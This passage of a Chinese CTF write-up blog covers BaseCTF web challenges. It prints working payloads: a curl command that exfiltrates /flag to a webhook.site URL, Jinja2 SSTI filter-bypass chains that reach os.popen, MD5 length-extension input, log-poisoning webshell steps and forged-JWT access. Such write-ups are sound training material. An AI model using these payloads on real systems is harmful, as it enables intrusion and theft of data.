+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后面的知识就涉及到哈希长度拓展攻击了</p>
+<p>参考文章: <a class="link" href="https://luoingly.top/post/md5-length-extension-attack/"  target="_blank" rel="noopener"
+    >https://luoingly.top/post/md5-length-extension-attack/</a></p>
+<p><a class="link" href="https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html"  target="_blank" rel="noopener"
+    >https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html</a></p>
+<p>全局变量random长度为96</p>
+<p><img src="/img/image-20240912194345475.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912194345475"
+	
+	
+></p>
+<p>而name由我们传入可控，后面还会和md5($random)拼接，我们可以构造payload进行填充让新建一个分组包含后面需要验证的admin</p>
+<p><img src="/img/image-20240912194501769.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912194501769"
+	
+	
+></p>
+<p><img src="/img/image-20240912194643351.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912194643351"
+	
+	
+></p>
+<p>这里使用<a class="link" href="https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py"  target="_blank" rel="noopener"
+    >工具</a>生成了，我是菜比</p>
+<p>先输入random的文本长度，然后是random的hash，最后是我们希望拓展的字符串</p>
+<p><img src="/static/img/image-20240912194812065.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912194812065"
+	
+	
+></p>
+<p>生成后选择url编码一次的payload，浏览器会自动对我们传递的参数进行一次解码。</p>
+<p>然后再传入新的hash，虽然字符串上看起来不一样，但在md5分组运算的时候是一样的，所以两个md5判断为相等，由此拿到flag</p>
+<p><img src="/img/image-20240912195117038.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912195117038"
+	
+	
+></p>
+<hr>
+<h4 id="week2-你听不到我的声音">[Week2] 你听不到我的声音
+</h4><p>这道题是一个无回显的RCE利用，方法有很多种</p>
+<ol>
+<li>重定向到文件</li>
+</ol>
+<p>导入到txt文件我们就可以进行访问了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat/cp/mv /flag &gt; 1.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/image-20240912203112250.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912203112250"
+	
+	
+></p>
+<ol start="2">
+<li></li>
+</ol>
+<p>利用curl命令和[webhook](<a class="link" href="https://webhook.site/"  target="_blank" rel="noopener"
+    >Webhook.site - Test, transform and automate Web requests and emails</a>)进行信息外带出flag</p>
+<p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl https://webhook.site/44f66666-8c8a-47bd-978a-84f7a596c7ff/`cat /flag | base64`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/image-20240912202923617.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912202923617"
+	
+	
+></p>
+<p><img src="/img/image-20240912202934575.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912202934575"
+	
+	
+></p>
+<ol start="3">
+<li>直接写马</li>
+</ol>
+<p>写马, 用 wget, curl 下载木马然后webshell管理工具连接</p>
+<hr>
+<h4 id="week2-数学大师">[Week2] 数学大师
+</h4><p>这道题我就只贴脚本了</p>
+<p>我的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import re
+</span></span><span class="line"><span class="cl">import requests
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">s = requests.Session()  # 使用Session对象
+</span></span><span class="line"><span class="cl">url = &#39;http://challenge.basectf.fun:37945/&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">res = s.get(url=url)    #get请求如果放到循环体相等于打开五十个页面了，我们只需在循环体里更新用于匹配计算式的文本即可
+</span></span><span class="line"><span class="cl">string = res.text
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">for i in range(50):
+</span></span><span class="line"><span class="cl">        # 提取算术表达式
+</span></span><span class="line"><span class="cl">        pattern = r&#39;second ([\d×÷+-/]+)&#39;
+</span></span><span class="line"><span class="cl">        matches = re.findall(pattern, string)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        expression = matches[0].replace(&#39;×&#39;, &#39;*&#39;).replace(&#39;÷&#39;, &#39;/&#39;)
+</span></span><span class="line"><span class="cl">        # 计算表达式
+</span></span><span class="line"><span class="cl">        result = int(eval(expression))
+</span></span><span class="line"><span class="cl">        r = s.post(url=url, data={&#39;answer&#39;: result})
+</span></span><span class="line"><span class="cl">        print(r.text)
+</span></span><span class="line"><span class="cl">        # 更新页面内容
+</span></span><span class="line"><span class="cl">        string = r.text
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>官方wp的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import requests
+</span></span><span class="line"><span class="cl">import re
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">req = requests.session()
+</span></span><span class="line"><span class="cl">url = &#34;http://challenge.basectf.fun:24989/&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">answer = 0
+</span></span><span class="line"><span class="cl">while True:
+</span></span><span class="line"><span class="cl">    response = req.post(url , data={&#34;answer&#34;: answer})
+</span></span><span class="line"><span class="cl">    print(response.text)
+</span></span><span class="line"><span class="cl">    if &#34;BaseCTF&#34; in response.text:
+</span></span><span class="line"><span class="cl">        print(response.text)
+</span></span><span class="line"><span class="cl">        break
+</span></span><span class="line"><span class="cl">    regex = r&#34; (\d*?)(.)(\d*)\?&#34;
+</span></span><span class="line"><span class="cl">    match = re.search(regex, response.text)
+</span></span><span class="line"><span class="cl">    if match.group(2) == &#34;+&#34;:
+</span></span><span class="line"><span class="cl">        answer = int(match.group(1)) + int(match.group(3))
+</span></span><span class="line"><span class="cl">    elif match.group(2) == &#34;-&#34;:
+</span></span><span class="line"><span class="cl">        answer = int(match.group(1)) - int(match.group(3))
+</span></span><span class="line"><span class="cl">    elif match.group(2) == &#34;×&#34;:
+</span></span><span class="line"><span class="cl">        answer = int(match.group(1)) * int(match.group(3))
+</span></span><span class="line"><span class="cl">    elif match.group(2) == &#34;÷&#34;:
+</span></span><span class="line"><span class="cl">        answer = int(match.group(1)) // int(match.group(3))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h4 id="week3-复读机">[Week3] 复读机
+</h4><p>这道题是ssti，模版引擎应该是jinja2,这里它必须以BaseCTF开头所以不能直接使用fengjing了。</p>
+<p>还过滤了双花括号，点和双引号和下划线</p>
+<p>寻找可用子类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BaseCTF{%print(&#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]())%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/image-20240912204346922.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912204346922"
+	
+	
+></p>
+<p>寻找一个含os模块能RCE的类，我这里懒得写脚本直接用Notepad++将逗号替换为换行符找到该模块的位置为137</p>
+<p><img src="/static/img/image-20240912204530622.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912204530622"
+	
+	
+></p>
+<p>继续构造继承链查看当前作用域中的全局变量</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BaseCTF{%print(&#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]()[137][&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;][&#39;_&#39;&#39;_glo&#39;&#39;bals_&#39;&#39;_&#39;])%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现Popen方法，可以用它执行命令再用read()读取即可</p>
+<p><img src="/img/image-20240912205307818.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912205307818"
+	
+	
+></p>
+<p>构造payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BaseCTF{%print(&#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]()[137][&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;][&#39;_&#39;&#39;_glo&#39;&#39;bals_&#39;&#39;_&#39;][&#39;po&#39;&#39;pen&#39;](&#39;id&#39;)[&#39;rea&#39;&#39;d&#39;]())%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行成功</p>
+<p><img src="/img/image-20240912205546055.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912205546055"
+	
+	
+></p>
+<p>但是发现根号被ban了，这里我开始只想到<code>${PATH:0:1}</code>,后面一位大佬研究处<code>${HOME%%root}</code></p>
+<p>一般HOME目录都在/root下</p>
+<p><img src="/img/image-20240912205752499.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912205752499"
+	
+	
+></p>
+<p>所以可构造payload查看flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BaseCTF{%print(&#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]()[137][&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;][&#39;_&#39;&#39;_glo&#39;&#39;bals_&#39;&#39;_&#39;][&#39;po&#39;&#39;pen&#39;](&#39;cat ${HOME%%root}flag&#39;)[&#39;rea&#39;&#39;d&#39;]())%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后面查看该系统环境变量存在一个为根号的环境变量</p>
+<p><img src="/static/img/image-20240912205859146.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912205859146"
+	
+	
+></p>
+<p>构造payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BaseCTF{%print(&#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]()[137][&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;][&#39;_&#39;&#39;_glo&#39;&#39;bals_&#39;&#39;_&#39;][&#39;po&#39;&#39;pen&#39;](&#39;cd $OLDPWD;cat flag&#39;)[&#39;rea&#39;&#39;d&#39;]())%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/static/img/image-20240912210153249.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912210153249"
+	
+	
+></p>
+<hr>
+<h4 id="week3-滤个不停">[Week3] 滤个不停
+</h4><p>源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">highlight_file(__FILE__);
+</span></span><span class="line"><span class="cl">error_reporting(0);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$incompetent = $_POST[&#39;incompetent&#39;];
+</span></span><span class="line"><span class="cl">$Datch = $_POST[&#39;Datch&#39;];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if ($incompetent !== &#39;HelloWorld&#39;) {
+</span></span><span class="line"><span class="cl">    die(&#39;写出程序员的第一行问候吧！&#39;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//这是个什么东东？？？
+</span></span><span class="line"><span class="cl">$required_chars = [&#39;s&#39;, &#39;e&#39;, &#39;v&#39;, &#39;a&#39;, &#39;n&#39;, &#39;x&#39;, &#39;r&#39;, &#39;o&#39;];
+</span></span><span class="line"><span class="cl">$is_valid = true;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">foreach ($required_chars as $char) {
+</span></span><span class="line"><span class="cl">    if (strpos($Datch, $char) === false) {//意思是必须在$Datch中找到上面所有字母
+</span></span><span class="line"><span class="cl">        $is_valid = false;
+</span></span><span class="line"><span class="cl">        break;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if ($is_valid) {
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    $invalid_patterns = [&#39;php://&#39;, &#39;http://&#39;, &#39;https://&#39;, &#39;ftp://&#39;, &#39;file://&#39; , &#39;data://&#39;, &#39;gopher://&#39;];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    foreach ($invalid_patterns as $pattern) {
+</span></span><span class="line"><span class="cl">        if (stripos($Datch, $pattern) !== false) {
+</span></span><span class="line"><span class="cl">            die(&#39;此路不通换条路试试?&#39;);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    include($Datch);
+</span></span><span class="line"><span class="cl">} else {
+</span></span><span class="line"><span class="cl">    die(&#39;文件名不合规 请重试&#39;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们要实现文件包含，但是一堆伪协议都被过滤掉了，没法绕过！</p>
+<p>后面查找资料发现这里可以用Nginx日志写入webshell</p>
+<p>日志路径为</p>
+<p><code>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</code></p>
+<p>利用access.log中User-Agent写入一句话木马，然后post里面传递参数执行命令</p>
+<p><img src="/img/8a94c7fc2a74d0201eebfb2560d22fa3.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="8a94c7fc2a74d0201eebfb2560d22fa3"
+	
+	
+></p>
+<hr>
+<h4 id="week4-no-jwt">[Week4] No JWT
+</h4><p>源码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from flask import Flask, request, jsonify
+</span></span><span class="line"><span class="cl">import jwt
+</span></span><span class="line"><span class="cl">import datetime
+</span></span><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">import random
+</span></span><span class="line"><span class="cl">import string
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app = Flask(__name__)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 随机生成 secret_key
+</span></span><span class="line"><span class="cl">app.secret_key = &#39;&#39;.join(random.choices(string.ascii_letters + string.digits, k=16))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 登录接口
+</span></span><span class="line"><span class="cl">@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
+</span></span><span class="line"><span class="cl">def login():
+</span></span><span class="line"><span class="cl">    data = request.json
+</span></span><span class="line"><span class="cl">    username = data.get(&#39;username&#39;)
+</span></span><span class="line"><span class="cl">    password = data.get(&#39;password&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    # 其他用户都给予 user 权限
+</span></span><span class="line"><span class="cl">    token = jwt.encode({
+</span></span><span class="line"><span class="cl">            &#39;sub&#39;: username,
+</span></span><span class="line"><span class="cl">            &#39;role&#39;: &#39;user&#39;,  # 普通用户角色
+</span></span><span class="line"><span class="cl">            &#39;exp&#39;: datetime.datetime.utcnow() + datetime.timedelta(hours=1)
+</span></span><span class="line"><span class="cl">        }, app.secret_key, algorithm=&#39;HS256&#39;)
+</span></span><span class="line"><span class="cl">    return jsonify({&#39;token&#39;: token}), 200
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># flag 接口
+</span></span><span class="line"><span class="cl">@app.route(&#39;/flag&#39;, methods=[&#39;GET&#39;])
+</span></span><span class="line"><span class="cl">def flag():
+</span></span><span class="line"><span class="cl">    token = request.headers.get(&#39;Authorization&#39;)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    if token:
+</span></span><span class="line"><span class="cl">        try:
+</span></span><span class="line"><span class="cl">            decoded = jwt.decode(token.split(&#34; &#34;)[1], options={&#34;verify_signature&#34;: False, &#34;verify_exp&#34;: False})
+</span></span><span class="line"><span class="cl">            # 检查用户角色是否为 admin
+</span></span><span class="line"><span class="cl">            if decoded.get(&#39;role&#39;) == &#39;admin&#39;:
+</span></span><span class="line"><span class="cl">                with open(&#39;/flag&#39;, &#39;r&#39;) as f:
+</span></span><span class="line"><span class="cl">                    flag_content = f.read()
+</span></span><span class="line"><span class="cl">                return jsonify({&#39;flag&#39;: flag_content}), 200
+</span></span><span class="line"><span class="cl">            else:
+</span></span><span class="line"><span class="cl">                return jsonify({&#39;message&#39;: &#39;Access denied: admin only&#39;}), 403
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">        except FileNotFoundError:
+</span></span><span class="line"><span class="cl">            return jsonify({&#39;message&#39;: &#39;Flag file not found&#39;}), 404
+</span></span><span class="line"><span class="cl">        except jwt.ExpiredSignatureError:
+</span></span><span class="line"><span class="cl">            return jsonify({&#39;message&#39;: &#39;Token has expired&#39;}), 401
+</span></span><span class="line"><span class="cl">        except jwt.InvalidTokenError:
+</span></span><span class="line"><span class="cl">            return jsonify({&#39;message&#39;: &#39;Invalid token&#39;}), 401
+</span></span><span class="line"><span class="cl">    return jsonify({&#39;message&#39;: &#39;Token is missing&#39;}), 401
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if __name__ == &#39;__main__&#39;:
+</span></span><span class="line"><span class="cl">    app.run(debug=True)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现/flag和/flag两个路由，先去login路由查看一下</p>
+<p>post方式访问，修改为json请求并传递json数据发现一串token</p>
+<p><img src="/img/image-20240912213928943.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912213928943"
+	
+	
+></p>
+<p>[jwt解密网站](<a class="link" href="https://jwt.io/"  target="_blank" rel="noopener"
+    >JSON Web Tokens - jwt.io</a>)解析一下token，flag路由检验身份必须为admin，我们修改即可</p>
+<p><img src="/img/image-20240912214249462.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912214249462"
+	
+	
+></p>
+<p>因为源码从headers中Authorization接受数据，我们手动添加一个</p>
+<p><img src="/img/image-20240912214422838.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912214422838"
+	
+	
+></p>
+<p>又因为如下原因</p>
+<blockquote>
+<p>在HTTP请求中，<code>Authorization</code>头部用于提供访问受保护资源所需的凭证。<code>Bearer</code>是认证的一种方式，它表示该请求中包含一个访问令牌（access token），这个令牌用于授权用户访问受保护的资源。</p>
+<p>具体来说，<code>Authorization</code>头部的格式为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Authorization: Bearer &lt;access_token&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中，<code>Bearer</code>关键字告诉服务器，接下来的 <code>&lt;access_token&gt;</code> 是一个令牌，用于授权请求。<code>Bearer</code> 认证方式是OAuth 2.0标准的一部分，用于实现无状态的访问控制，令牌通常由身份验证服务器颁发，并在请求中传递，用于验证用户身份和权限。</p>
+<p>总的来说，<code>Bearer</code>前缀的作用是明确标识令牌的类型，告诉服务器如何处理和验证这个令牌。</p>
+</blockquote>
+<p>所以我们构造出如下数据包即可获得flag</p>
+<p><img src="/static/img/image-20240912214738658.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240912214738658"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 gucheNg
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.27.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
